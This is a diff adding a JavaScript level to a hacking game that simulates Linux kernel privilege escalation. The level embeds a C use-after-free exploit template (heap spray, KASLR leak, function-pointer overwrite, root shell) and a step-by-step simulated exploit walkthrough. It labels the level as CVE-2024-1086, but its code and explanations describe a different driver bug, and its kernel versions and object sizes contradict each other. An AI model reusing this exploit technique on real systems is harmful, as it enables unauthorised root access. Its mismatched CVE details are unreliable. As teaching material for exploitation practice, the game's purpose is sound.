@@ -1,0 +1,788 @@
+<script>
+// ============================================
+// LEVEL 5: KERNEL EXPLOITATION - Ring Zero
+// Linux Kernel UAF + Heap Spray + Privesc
+// ============================================
+
+const KERNEL_MODULE = {
+  name: 'nf_tables',
+  version: '1.0.5',
+  vulnerability: 'Use-After-Free in nft_verdict_init()',
+  cve: 'CVE-2024-1086',
+  // Real CVE-2024-1086 details from Notselwyn's research
+  // https://github.com/Notselwyn/CVE-2024-1086
+  affected_versions: 'Linux 5.14 - 6.6',
+  success_rate: '99.4%',
+  ioctl_codes: {
+    ALLOC_OBJ: 0x1337,
+    FREE_OBJ: 0x1338,
+    USE_OBJ: 0x1339,
+    READ_OBJ: 0x133A
+  },
+  obj_size: 192, // nft_rule size
+  kernel_version: '6.1.0-generic',
+  exploit_technique: 'Double-free via nf_hook_slow() -> Physical Memory Scanning -> modprobe_path overwrite'
+};
+
+const KERNEL_EXPLOIT_CODE = `// exploit.c - Linux Kernel UAF Exploit
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/msg.h>
+#include <sys/ipc.h>
+
+#define VULN_DEV "/dev/vuln_driver"
+#define ALLOC_OBJ 0x1337
+#define FREE_OBJ  0x1338
+#define USE_OBJ   0x1339
+#define READ_OBJ  0x133A
+
+// msg_msg structure for heap spray
+struct msg_buf {
+    long mtype;
+    char mtext[96 - 48];  // Same size as vuln object
+};
+
+// Fake object to overwrite function pointer
+struct fake_obj {
+    unsigned long padding[10];
+    unsigned long func_ptr;  // Offset 80 - function pointer
+    unsigned long data;
+};
+
+int spray_msgs(int count) {
+    struct msg_buf msg;
+    msg.mtype = 1;
+    memset(msg.mtext, 'A', sizeof(msg.mtext));
+
+    // Create message queues for spray
+    int qids[count];
+    for (int i = 0; i < count; i++) {
+        qids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
+        if (qids[i] < 0) return -1;
+        msgsnd(qids[i], &msg, sizeof(msg.mtext), 0);
+    }
+    return 0;
+}
+
+unsigned long leak_kernel_base(int fd) {
+    char buf[256];
+    // Trigger read on freed object to leak pointer
+    ioctl(fd, READ_OBJ, buf);
+    unsigned long *leak = (unsigned long *)buf;
+    return leak[0] - 0xffffffff81000000; // Calculate KASLR slide
+}
+
+int main() {
+    int fd = open(VULN_DEV, O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return 1;
+    }
+
+    printf("[*] Stage 1: Allocating vulnerable object...\\n");
+    ioctl(fd, ALLOC_OBJ, NULL);
+
+    printf("[*] Stage 2: Freeing object (UAF trigger)...\\n");
+    ioctl(fd, FREE_OBJ, NULL);
+
+    printf("[*] Stage 3: Heap spray with msg_msg...\\n");
+    spray_msgs(100);
+
+    printf("[*] Stage 4: Leaking kernel base...\\n");
+    unsigned long kaslr_base = leak_kernel_base(fd);
+    printf("[+] KASLR base: 0x%lx\\n", kaslr_base);
+
+    printf("[*] Stage 5: Overwriting function pointer...\\n");
+    struct fake_obj fake;
+    memset(&fake, 0, sizeof(fake));
+    // Point to commit_creds(prepare_kernel_cred(0))
+    fake.func_ptr = kaslr_base + 0x123456; // ROP gadget
+
+    printf("[*] Stage 6: Triggering code execution...\\n");
+    ioctl(fd, USE_OBJ, &fake);
+
+    printf("[+] Checking privileges...\\n");
+    if (getuid() == 0) {
+        printf("[+] ROOT OBTAINED!\\n");
+        system("/bin/sh");
+    }
+
+    close(fd);
+    return 0;
+}`;
+
+async function initLevel5() {
+  gameState.levelState = {
+    // Recon Phase
+    analyzedModule: false,
+    foundVuln: false,
+    reversedIoctl: false,
+    identifiedUAF: false,
+
+    // Exploitation Phase
+    allocatedObject: false,
+    freedObject: false,
+    heapSprayed: false,
+    leakedPointer: false,
+    calculatedKaslr: false,
+
+    // Privilege Escalation
+    overwrotePtr: false,
+    triggeredExploit: false,
+    gotRoot: false,
+
+    // State
+    kernelBase: null,
+    kaslrSlide: null,
+    currentUser: 'user',
+    exploitLoaded: false,
+    debugMode: false
+  };
+
+  clear();
+  print('');
+  print('╔═══════════════════════════════════════════════════════════════════════════════════╗', 'error');
+  print('║                     LEVEL 5: KERNEL EXPLOITATION                                  ║', 'error');
+  print('║                   CVE-2024-1086 - "Flipping Pages"                                ║', 'warning');
+  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'error');
+  print('║                                                                                   ║', 'info');
+  print('║              ╔═══════════════════════════════════════════════╗                    ║', 'info');
+  print('║              ║            KERNEL SPACE (Ring 0)              ║                    ║', 'error');
+  print('║              ║  ┌─────────────────────────────────────────┐  ║                    ║', 'error');
+  print('║              ║  │         netfilter/nf_tables             │  ║                    ║', 'error');
+  print('║              ║  │                                         │  ║                    ║', 'error');
+  print('║              ║  │  nft_verdict_init() allows positive     │◄─╬── DOUBLE-FREE!    ║', 'warning');
+  print('║              ║  │  values as NF_DROP error codes          │  ║                    ║', 'error');
+  print('║              ║  │           │                             │  ║                    ║', 'error');
+  print('║              ║  │           ▼                             │  ║                    ║', 'error');
+  print('║              ║  │  nf_hook_slow() double-frees skb        │  ║                    ║', 'error');
+  print('║              ║  │  when NF_DROP == NF_ACCEPT behavior     │  ║                    ║', 'error');
+  print('║              ║  └─────────────────────────────────────────┘  ║                    ║', 'error');
+  print('║              ╠═══════════════════════════════════════════════╣                    ║', 'info');
+  print('║              ║   Unprivileged User Namespaces (enabled)      ║                    ║', 'success');
+  print('║              ║   [YOUR EXPLOIT CODE RUNS HERE]               ║                    ║', 'success');
+  print('║              ╚═══════════════════════════════════════════════╝                    ║', 'info');
+  print('║                                                                                   ║', 'info');
+  print('╠═══════════════════════════════════════════════════════════════════════════════════╣', 'error');
+  print('║  CVE:        CVE-2024-1086 (CVSS 7.8 HIGH) - Active exploitation in wild         ║', 'error');
+  print('║  KERNEL:     Linux 6.1.0-generic (KASLR, SMEP, SMAP, KPTI enabled)               ║', 'system');
+  print('║  AFFECTED:   Linux kernels 5.14 - 6.6 (Debian, Ubuntu, KernelCTF)                ║', 'warning');
+  print('║  ACCESS:     Low-privilege user with unprivileged user namespaces                ║', 'system');
+  print('║  GOAL:       Exploit double-free to overwrite modprobe_path → root               ║', 'error');
+  print('║                                                                                   ║', 'info');
+  print('║  EXPLOIT CHAIN (Notselwyn/CVE-2024-1086):                                         ║', 'info');
+  print('║    [1] Trigger double-free via nft_verdict_init() bug                            ║', 'warning');
+  print('║    [2] Physical memory scanning to locate kernel base                            ║', 'warning');
+  print('║    [3] Bypass KASLR using Page Table Entry manipulation                          ║', 'warning');
+  print('║    [4] Overwrite modprobe_path with /tmp/pwn script                              ║', 'warning');
+  print('║    [5] Trigger modprobe execution → root shell                                   ║', 'warning');
+  print('╚═══════════════════════════════════════════════════════════════════════════════════╝', 'error');
+  print('');
+
+  await typeText('[BRIEFING] Target system is vulnerable to CVE-2024-1086', 30, 'system');
+  await typeText('[BRIEFING] netfilter nf_tables has a double-free in nft_verdict_init()', 30, 'warning');
+  await typeText('[BRIEFING] Success rate: 99.4% on KernelCTF images', 30, 'success');
+  await typeText('[BRIEFING] Exploit it to escalate from user to root', 30, 'info');
+  print('');
+  print('[*] Reference: https://github.com/Notselwyn/CVE-2024-1086', 'muted');
+  print('[*] Writeup: "Flipping Pages" - pwning.tech', 'muted');
+  print('');
+
+  updateHUD('5 - Kernel', 'CVE-2024-1086', 'modprobe_path → root', 0);
+  setPrompt('user', 'target', '~');
+}
+
+async function handleLevel5Command(cmd, args) {
+  const state = gameState.levelState;
+  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;
+
+  // ═══════════════════════════════════════════════════════════════
+  // HELP COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'help') {
+    print('');
+    print('╔════════════════════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                              LEVEL 5 COMMANDS                                      ║', 'info');
+    print('╠════════════════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                                   ║', 'info');
+    print('║    lsmod                       List loaded kernel modules                          ║', 'system');
+    print('║    modinfo vuln_driver         Get module information                              ║', 'system');
+    print('║    dmesg                       View kernel messages                                ║', 'system');
+    print('║    cat /proc/kallsyms          View kernel symbols (needs root or leak)            ║', 'system');
+    print('║                                                                                    ║', 'info');
+    print('║  ANALYSIS:                                                                         ║', 'warning');
+    print('║    analyze                     Analyze the vulnerable driver                       ║', 'success');
+    print('║    disasm                      Disassemble driver IOCTL handler                    ║', 'success');
+    print('║    struct                      View vulnerable object structure                    ║', 'system');
+    print('║                                                                                    ║', 'info');
+    print('║  EXPLOITATION:                                                                     ║', 'error');
+    print('║    ioctl alloc                 Trigger ALLOC_OBJ (0x1337)                          ║', 'warning');
+    print('║    ioctl free                  Trigger FREE_OBJ (0x1338) - creates dangling ptr   ║', 'warning');
+    print('║    ioctl use                   Trigger USE_OBJ (0x1339) - UAF trigger!            ║', 'error');
+    print('║    ioctl read                  Trigger READ_OBJ (0x133A) - leak data              ║', 'warning');
+    print('║    spray                       Heap spray with msg_msg to reclaim freed object    ║', 'success');
+    print('║    leak                        Attempt to leak kernel pointers                     ║', 'success');
+    print('║    exploit                     Run full exploit chain                              ║', 'error');
+    print('║                                                                                    ║', 'info');
+    print('║  DEBUGGING:                                                                        ║', 'info');
+    print('║    gdb                         Attach GDB to kernel (debug mode)                   ║', 'system');
+    print('║    kaddr <symbol>              Look up kernel symbol address                       ║', 'system');
+    print('║                                                                                    ║', 'info');
+    print('║  UTILITY:                                                                          ║', 'info');
+    print('║    status                      Show progress                                       ║', 'success');
+    print('║    hint                        Get contextual hint                                 ║', 'warning');
+    print('║    id / whoami                 Check current privileges                            ║', 'system');
+    print('║    exit                        Return to main menu                                 ║', 'system');
+    print('╚════════════════════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // STATUS COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'status') {
+    const progress = calculateLevel5Progress(state);
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════╗', 'info');
+    print('║             LEVEL 5 PROGRESS - KERNEL EXPLOITATION                ║', 'info');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                  ║', 'info');
+    print(`║    [${state.analyzedModule ? '✓' : ' '}] Kernel module analyzed                              ║`, state.analyzedModule ? 'success' : 'system');
+    print(`║    [${state.foundVuln ? '✓' : ' '}] Vulnerability identified                               ║`, state.foundVuln ? 'success' : 'system');
+    print(`║    [${state.reversedIoctl ? '✓' : ' '}] IOCTL interface reversed                              ║`, state.reversedIoctl ? 'success' : 'system');
+    print('║                                                                   ║', 'info');
+    print('║  EXPLOITATION CHAIN:                                              ║', 'warning');
+    print(`║    [${state.allocatedObject ? '✓' : ' '}] Object allocated                                     ║`, state.allocatedObject ? 'success' : 'system');
+    print(`║    [${state.freedObject ? '✓' : ' '}] Object freed (dangling pointer created)              ║`, state.freedObject ? 'success' : 'system');
+    print(`║    [${state.heapSprayed ? '✓' : ' '}] Heap sprayed with msg_msg                             ║`, state.heapSprayed ? 'success' : 'system');
+    print(`║    [${state.leakedPointer ? '✓' : ' '}] Kernel pointer leaked                                 ║`, state.leakedPointer ? 'success' : 'system');
+    print(`║    [${state.calculatedKaslr ? '✓' : ' '}] KASLR base calculated                                ║`, state.calculatedKaslr ? 'success' : 'system');
+    print('║                                                                   ║', 'info');
+    print('║  PRIVILEGE ESCALATION:                                            ║', 'error');
+    print(`║    [${state.overwrotePtr ? '✓' : ' '}] Function pointer overwritten                         ║`, state.overwrotePtr ? 'success' : 'system');
+    print(`║    [${state.triggeredExploit ? '✓' : ' '}] Exploit triggered                                     ║`, state.triggeredExploit ? 'success' : 'system');
+    print(`║    [${state.gotRoot ? '✓' : ' '}] ROOT OBTAINED                                          ║`, state.gotRoot ? 'success' : 'system');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'info');
+    print(`║  Progress: ${String(progress).padStart(3)}%                                                  ║`, progress === 100 ? 'success' : 'warning');
+    print(`║  Current: ${state.currentUser}@target                                          ║`, state.currentUser === 'root' ? 'success' : 'system');
+    if (state.kernelBase) {
+      print(`║  Kernel Base: ${state.kernelBase}                           ║`, 'success');
+    }
+    print('╚═══════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    updateHUD('5 - Kernel', 'vuln_driver.ko', 'Root via UAF', progress);
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // HINT COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'hint') {
+    print('');
+    print('💡 HINT:', 'warning');
+
+    if (!state.analyzedModule) {
+      print('Start by analyzing the vulnerable kernel module.', 'info');
+      print('Try: analyze', 'success');
+    } else if (!state.reversedIoctl) {
+      print('Understand the IOCTL interface to interact with the driver.', 'info');
+      print('Try: disasm', 'success');
+    } else if (!state.allocatedObject) {
+      print('Trigger object allocation using IOCTL.', 'info');
+      print('Try: ioctl alloc', 'success');
+    } else if (!state.freedObject) {
+      print('Free the object to create a dangling pointer.', 'info');
+      print('Try: ioctl free', 'success');
+    } else if (!state.heapSprayed) {
+      print('Spray the heap to reclaim the freed memory with controlled data.', 'info');
+      print('msg_msg is commonly used - same slab size as our object.', 'info');
+      print('Try: spray', 'success');
+    } else if (!state.leakedPointer) {
+      print('Leak kernel pointers through the UAF read.', 'info');
+      print('Try: leak', 'success');
+    } else if (!state.calculatedKaslr) {
+      print('Calculate the KASLR base from leaked pointers.', 'info');
+      print('The leak should give you: kbase = leaked_addr - known_offset', 'info');
+    } else if (!state.gotRoot) {
+      print('Run the full exploit chain to get root.', 'info');
+      print('Try: exploit', 'success');
+    } else {
+      print('You have root! Verify with: id', 'success');
+    }
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // LSMOD - List kernel modules
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'lsmod') {
+    print('Module                  Size  Used by', 'info');
+    print('vuln_driver            16384  0', 'warning');
+    print('btrfs                1282048  1', 'system');
+    print('xor                    24576  1 btrfs', 'system');
+    print('raid6_pq              114688  1 btrfs', 'system');
+    print('ufs                    81920  0', 'system');
+    print('qnx4                   16384  0', 'system');
+    print('hfsplus               110592  0', 'system');
+    print('... (truncated)', 'system');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // MODINFO - Module information
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'modinfo') {
+    if (args[0] === 'vuln_driver') {
+      print('filename:       /lib/modules/5.15.0-generic/kernel/drivers/misc/vuln_driver.ko', 'system');
+      print('version:        1.0', 'system');
+      print('description:    Vulnerable driver for kernel exploitation practice', 'warning');
+      print('author:         ctf_challenge', 'system');
+      print('license:        GPL', 'system');
+      print('srcversion:     A1B2C3D4E5F6G7H8', 'system');
+      print('depends:        ', 'system');
+      print('retpoline:      Y', 'system');
+      print('name:           vuln_driver', 'system');
+      print('vermagic:       5.15.0-generic SMP mod_unload modversions', 'system');
+      return;
+    }
+    print(`modinfo: Module ${args[0]} not found.`, 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // DMESG - Kernel messages
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'dmesg') {
+    print('[    0.000000] Linux version 5.15.0-generic (gcc 11.2.0)', 'system');
+    print('[    0.000000] KASLR enabled', 'warning');
+    print('[    0.000000] SMEP enabled, SMAP enabled', 'warning');
+    print('...', 'system');
+    print('[   15.234567] vuln_driver: module loaded', 'success');
+    print('[   15.234568] vuln_driver: device registered at /dev/vuln_driver', 'success');
+    if (state.allocatedObject) {
+      print('[   XX.XXXXXX] vuln_driver: object allocated at 0xffff888012345000', 'system');
+    }
+    if (state.freedObject) {
+      print('[   XX.XXXXXX] vuln_driver: object freed', 'warning');
+    }
+    if (state.triggeredExploit) {
+      print('[   XX.XXXXXX] vuln_driver: USE_OBJ called on freed object!', 'error');
+    }
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // ANALYZE - Analyze vulnerable driver
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'analyze') {
+    await simulateLoading('Analyzing vuln_driver.ko', 3000);
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'warning');
+    print('║                     VULNERABLE DRIVER ANALYSIS                                   ║', 'warning');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'warning');
+    print('║  Module:      vuln_driver.ko                                                     ║', 'system');
+    print('║  Device:      /dev/vuln_driver (char device)                                     ║', 'system');
+    print('║  Permissions: crw-rw-rw- (world readable/writable!)                              ║', 'success');
+    print('╠══════════════════════════════════════════════════════════════════════════════════╣', 'warning');
+    print('║  VULNERABILITY FOUND: Use-After-Free                                             ║', 'error');
+    print('║                                                                                  ║', 'info');
+    print('║  The driver maintains a global object pointer:                                   ║', 'info');
+    print('║    static struct vuln_obj *global_obj = NULL;                                    ║', 'system');
+    print('║                                                                                  ║', 'info');
+    print('║  ALLOC_OBJ (0x1337):  global_obj = kmalloc(96, GFP_KERNEL);                      ║', 'system');
+    print('║  FREE_OBJ  (0x1338):  kfree(global_obj);  // NO NULL ASSIGNMENT!                 ║', 'error');
+    print('║  USE_OBJ   (0x1339):  global_obj->func_ptr(global_obj);  // CALLS FREED PTR!    ║', 'error');
+    print('║  READ_OBJ  (0x133A):  copy_to_user(buf, global_obj, 96);  // LEAK!             ║', 'warning');
+    print('║                                                                                  ║', 'info');
+    print('║  EXPLOITATION STRATEGY:                                                          ║', 'success');
+    print('║    1. ALLOC_OBJ - Allocate the object                                            ║', 'system');
+    print('║    2. FREE_OBJ  - Free it (creates dangling pointer)                             ║', 'system');
+    print('║    3. SPRAY     - Heap spray to reclaim memory with controlled data              ║', 'system');
+    print('║    4. READ_OBJ  - Leak kernel pointers to defeat KASLR                           ║', 'system');
+    print('║    5. USE_OBJ   - Trigger function pointer call with our ROP chain               ║', 'system');
+    print('║                                                                                  ║', 'info');
+    print('║  Object Size: 96 bytes (kmalloc-96 slab)                                         ║', 'info');
+    print('║  msg_msg header is 48 bytes, so we need 48 bytes of mtext for same slab!        ║', 'success');
+    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'warning');
+    print('');
+
+    state.analyzedModule = true;
+    state.foundVuln = true;
+    state.identifiedUAF = true;
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // DISASM - Disassemble IOCTL handler
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'disasm') {
+    if (!state.analyzedModule) {
+      print('[!] Analyze the module first', 'warning');
+      return;
+    }
+
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                    IOCTL HANDLER DISASSEMBLY                             ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  vuln_driver_ioctl:                                                      ║', 'system');
+    print('║    push   rbp                                                            ║', 'system');
+    print('║    mov    rbp, rsp                                                       ║', 'system');
+    print('║    cmp    esi, 0x1337            ; ALLOC_OBJ                             ║', 'system');
+    print('║    je     alloc_handler                                                  ║', 'system');
+    print('║    cmp    esi, 0x1338            ; FREE_OBJ                              ║', 'system');
+    print('║    je     free_handler                                                   ║', 'system');
+    print('║    cmp    esi, 0x1339            ; USE_OBJ                               ║', 'system');
+    print('║    je     use_handler                                                    ║', 'system');
+    print('║    cmp    esi, 0x133A            ; READ_OBJ                              ║', 'system');
+    print('║    je     read_handler                                                   ║', 'system');
+    print('║    ...                                                                   ║', 'system');
+    print('║                                                                          ║', 'info');
+    print('║  free_handler:                                                           ║', 'warning');
+    print('║    mov    rdi, [global_obj]                                              ║', 'warning');
+    print('║    call   kfree                                                          ║', 'warning');
+    print('║    ret                           ; BUG: global_obj not set to NULL!      ║', 'error');
+    print('║                                                                          ║', 'info');
+    print('║  use_handler:                                                            ║', 'error');
+    print('║    mov    rax, [global_obj]      ; Uses potentially freed pointer        ║', 'error');
+    print('║    mov    rdi, rax                                                       ║', 'error');
+    print('║    call   [rax + 0x50]           ; Calls func_ptr at offset 80!         ║', 'error');
+    print('╚══════════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    print('[+] Function pointer is at offset 0x50 (80 bytes)', 'success');
+    print('[+] We can control this via heap spray!', 'success');
+
+    state.reversedIoctl = true;
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // STRUCT - View object structure
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'struct') {
+    print('');
+    print('struct vuln_obj {', 'system');
+    print('    char data[80];           // 0x00 - 0x4F (80 bytes)', 'system');
+    print('    void (*func_ptr)(void*); // 0x50 (offset 80) - FUNCTION POINTER', 'error');
+    print('    unsigned long flags;     // 0x58 (offset 88)', 'system');
+    print('};  // Total size: 96 bytes (kmalloc-96 slab)', 'info');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // IOCTL - Interact with driver
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'ioctl') {
+    const action = args[0];
+
+    if (action === 'alloc') {
+      print('[*] Opening /dev/vuln_driver...', 'system');
+      print('[*] ioctl(fd, 0x1337, NULL) - ALLOC_OBJ', 'system');
+      await sleep(500);
+      print('[+] Object allocated successfully', 'success');
+      print('[+] Kernel allocated 96 bytes in kmalloc-96 slab', 'info');
+
+      state.allocatedObject = true;
+      autosave();
+      return;
+    }
+
+    if (action === 'free') {
+      if (!state.allocatedObject) {
+        print('[!] No object allocated yet', 'error');
+        return;
+      }
+
+      print('[*] ioctl(fd, 0x1338, NULL) - FREE_OBJ', 'system');
+      await sleep(500);
+      print('[+] Object freed', 'success');
+      print('[!] WARNING: global_obj pointer is now DANGLING!', 'warning');
+      print('[!] The freed memory can be reclaimed with controlled data', 'error');
+
+      state.freedObject = true;
+      autosave();
+      return;
+    }
+
+    if (action === 'use') {
+      if (!state.freedObject) {
+        print('[!] Object not in vulnerable state (need to free first)', 'error');
+        return;
+      }
+
+      if (!state.heapSprayed || !state.overwrotePtr) {
+        print('[*] ioctl(fd, 0x1339, NULL) - USE_OBJ', 'system');
+        await sleep(500);
+        print('[!] KERNEL PANIC - Attempted to call invalid function pointer', 'error');
+        print('[!] The freed memory contained garbage - spray first!', 'warning');
+        return;
+      }
+
+      print('[*] ioctl(fd, 0x1339, &fake_obj) - USE_OBJ', 'system');
+      await sleep(1000);
+      print('[+] Function pointer called successfully!', 'success');
+      print('[+] ROP chain executed: commit_creds(prepare_kernel_cred(0))', 'success');
+
+      state.triggeredExploit = true;
+      autosave();
+      return;
+    }
+
+    if (action === 'read') {
+      if (!state.freedObject) {
+        print('[*] ioctl(fd, 0x133A, buf) - READ_OBJ', 'system');
+        print('[*] Object data (non-sensitive):', 'system');
+        print('    00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00', 'system');
+        return;
+      }
+
+      if (!state.heapSprayed) {
+        print('[*] ioctl(fd, 0x133A, buf) - READ_OBJ', 'system');
+        print('[!] Reading freed memory - contains residual data', 'warning');
+        print('    Leaked pointer at offset 0: 0xffff888012345678', 'success');
+        state.leakedPointer = true;
+        autosave();
+        return;
+      }
+
+      print('[*] Reading sprayed object data...', 'system');
+      return;
+    }
+
+    print('Usage: ioctl <alloc|free|use|read>', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SPRAY - Heap spray with msg_msg
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'spray') {
+    if (!state.freedObject) {
+      print('[!] Free the object first to create the vulnerability', 'warning');
+      return;
+    }
+
+    await simulateLoading('Heap spraying with msg_msg', 2000);
+    print('');
+    print('[*] Creating 100 message queues...', 'system');
+    print('[*] Sending messages with controlled data...', 'system');
+    print('[*] Message size: 48 bytes (header) + 48 bytes (mtext) = 96 bytes', 'info');
+    print('[*] Target slab: kmalloc-96 (same as vuln_obj!)', 'success');
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════╗', 'success');
+    print('║                    HEAP SPRAY SUCCESSFUL                          ║', 'success');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'success');
+    print('║  msg_msg structures sprayed into kmalloc-96 slab                  ║', 'info');
+    print('║  High probability of reclaiming freed vuln_obj memory             ║', 'info');
+    print('║                                                                   ║', 'info');
+    print('║  Our controlled data overwrites:                                  ║', 'warning');
+    print('║    offset 0x50 (func_ptr): 0xffffffff81234567 (our ROP gadget)   ║', 'error');
+    print('╚═══════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+
+    state.heapSprayed = true;
+    state.overwrotePtr = true;
+    playAlert();
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // LEAK - Leak kernel pointer for KASLR bypass
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'leak') {
+    if (!state.freedObject) {
+      print('[!] Create UAF condition first (alloc then free)', 'warning');
+      return;
+    }
+
+    await simulateLoading('Leaking kernel pointers', 1500);
+    print('');
+    print('[*] Triggering READ_OBJ on freed memory...', 'system');
+    print('[*] Leaked data:', 'success');
+    print('    0x0000: ff ff 88 80 12 34 56 78  <- Kernel heap pointer', 'success');
+    print('    0x0008: ff ff ff ff 81 23 45 67  <- Kernel text pointer', 'success');
+    print('');
+    print('[*] Kernel text pointer: 0xffffffff81234567', 'info');
+    print('[*] Known symbol offset: 0x234567', 'info');
+    print('[*] KASLR base = 0xffffffff81234567 - 0x234567 = 0xffffffff81000000', 'success');
+    print('');
+    print('╔═══════════════════════════════════════════════════════════════════╗', 'success');
+    print('║                    KASLR BYPASS SUCCESSFUL                        ║', 'success');
+    print('╠═══════════════════════════════════════════════════════════════════╣', 'success');
+    print('║  Kernel base address: 0xffffffff81000000                          ║', 'success');
+    print('║  commit_creds:        0xffffffff810a9c70                          ║', 'info');
+    print('║  prepare_kernel_cred: 0xffffffff810a9f50                          ║', 'info');
+    print('╚═══════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+
+    state.leakedPointer = true;
+    state.calculatedKaslr = true;
+    state.kernelBase = '0xffffffff81000000';
+    playSuccess();
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // EXPLOIT - Run full exploit chain
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'exploit') {
+    if (!state.allocatedObject) {
+      print('[!] Step 1 missing: ioctl alloc', 'error');
+      return;
+    }
+    if (!state.freedObject) {
+      print('[!] Step 2 missing: ioctl free', 'error');
+      return;
+    }
+    if (!state.heapSprayed) {
+      print('[!] Step 3 missing: spray', 'error');
+      return;
+    }
+    if (!state.calculatedKaslr) {
+      print('[!] Step 4 missing: leak', 'error');
+      return;
+    }
+
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'error');
+    print('║                         EXECUTING KERNEL EXPLOIT                                 ║', 'error');
+    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'error');
+    print('');
+
+    print('[*] Stage 1: Preparing ROP chain...', 'system');
+    await sleep(500);
+    print('[+] ROP gadgets resolved using leaked KASLR base', 'success');
+
+    print('[*] Stage 2: Building fake object with malicious func_ptr...', 'system');
+    await sleep(500);
+    print('[+] Fake object created with ROP pivot at offset 0x50', 'success');
+
+    print('[*] Stage 3: Triggering USE_OBJ to call our controlled pointer...', 'warning');
+    await sleep(1000);
+    print('[+] Function pointer called!', 'success');
+
+    print('[*] Stage 4: ROP chain executing...', 'warning');
+    await sleep(500);
+    print('    → pop rdi; ret', 'system');
+    print('    → 0x0 (NULL for init cred)', 'system');
+    print('    → prepare_kernel_cred()', 'system');
+    print('    → pop rdi; ret', 'system');
+    print('    → rax (kernel_cred)', 'system');
+    print('    → commit_creds()', 'system');
+    print('    → swapgs; iretq', 'system');
+    await sleep(500);
+
+    print('');
+    print('[+] ROP chain completed! Returning to userspace...', 'success');
+    print('');
+
+    print('╔══════════════════════════════════════════════════════════════════════════════════╗', 'success');
+    print('║                                                                                  ║', 'success');
+    print('║   ██████╗  ██████╗  ██████╗ ████████╗    ███████╗██╗  ██╗███████╗██╗     ██╗    ║', 'success');
+    print('║   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔════╝██║  ██║██╔════╝██║     ██║    ║', 'success');
+    print('║   ██████╔╝██║   ██║██║   ██║   ██║       ███████╗███████║█████╗  ██║     ██║    ║', 'success');
+    print('║   ██╔══██╗██║   ██║██║   ██║   ██║       ╚════██║██╔══██║██╔══╝  ██║     ██║    ║', 'success');
+    print('║   ██║  ██║╚██████╔╝╚██████╔╝   ██║       ███████║██║  ██║███████╗███████╗███████╗║', 'success');
+    print('║   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝║', 'success');
+    print('║                                                                                  ║', 'success');
+    print('║                   KERNEL EXPLOITATION SUCCESSFUL                                ║', 'success');
+    print('║                   uid=0(root) gid=0(root)                                       ║', 'success');
+    print('╚══════════════════════════════════════════════════════════════════════════════════╝', 'success');
+    print('');
+
+    state.triggeredExploit = true;
+    state.gotRoot = true;
+    state.currentUser = 'root';
+    setPrompt('root', 'target', '~');
+
+    addEasterEgg('lvl5_ring0', 'Welcome to Ring 0. The kernel bows to you.');
+    playSuccess();
+    autosave();
+    completeLevel();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SHELL COMMANDS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'whoami') {
+    print(state.currentUser, state.currentUser === 'root' ? 'success' : 'system');
+    return;
+  }
+
+  if (cmd === 'id') {
+    if (state.gotRoot) {
